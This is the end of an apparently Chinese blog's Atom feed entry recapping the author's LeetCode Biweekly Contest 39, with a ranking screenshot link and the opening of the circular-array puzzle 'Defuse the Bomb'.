      &lt;h1 id=&quot;leetcode-biweekly-contest-39&quot;&gt;&lt;a href=&quot;#leetcode-biweekly-contest-39&quot; class=&quot;headerlink&quot; title=&quot;leetcode biweekly contest 39&quot;&gt;&lt;/a&gt;leetcode biweekly contest 39&lt;/h1&gt;&lt;p&gt;双周赛的题目，前三题比较容易，第四题是经典的状态压缩空间，竟然没有做出来，还是对算法的数量度掌握不够，对于状态子空间里的遍历还是没有掌握住.最终排名如下：&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/15/EV9JLbdmjH74iIY.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5550-拆炸弹&quot;&gt;&lt;a href=&quot;#5550-拆炸弹&quot; class=&quot;headerlink&quot; title=&quot;5550. 拆炸弹&quot;&gt;&lt;/a&gt;5550. 拆炸弹&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;你有一个炸弹需要拆除，时间紧迫！你的情报员会给你一个长度为 n 的 循环 数组 code 以及一个密钥 k 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
</feed>
